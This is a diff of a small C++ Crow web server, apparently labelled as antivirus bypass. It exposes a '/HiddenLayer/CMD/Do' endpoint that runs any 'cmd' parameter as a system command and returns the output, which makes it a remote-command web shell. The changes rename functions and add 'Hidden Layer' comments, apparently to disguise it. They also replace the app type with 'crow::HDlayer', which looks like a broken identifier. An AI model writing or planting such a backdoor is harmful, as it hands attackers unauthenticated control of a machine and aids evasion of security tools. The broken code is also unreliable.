@@ -44,7 +44,8 @@ AV BYPASS :
 #include <iostream>
 #include <sstream>
 
-std::string executeCommand(const std::string& command) {
+// CMD EXEC
+std::string Exec(const std::string& command) {
     std::array<char, 128> buffer;
     std::stringstream result;
     
@@ -59,8 +60,9 @@ std::string executeCommand(const std::string& command) {
     return result.str();
 }
 
+// Hidden Layer
 int main() {
-    crow::SimpleApp app;
+    crow::HDlayer app;
 
     CROW_ROUTE(app, "/HiddenLayer/CMD/Do")
         .methods(crow::HTTPMethod::GET)([](const crow::request& req) {
@@ -71,12 +73,11 @@ int main() {
                 return crow::response(400, "Missing 'cmd' parameter");
             }
 
-            std::string output = executeCommand(command);
+            std::string output = Exec(command);
             return crow::response(output);
         });
 
     app.port(18080).multithreaded().run();
 }
-
 
 
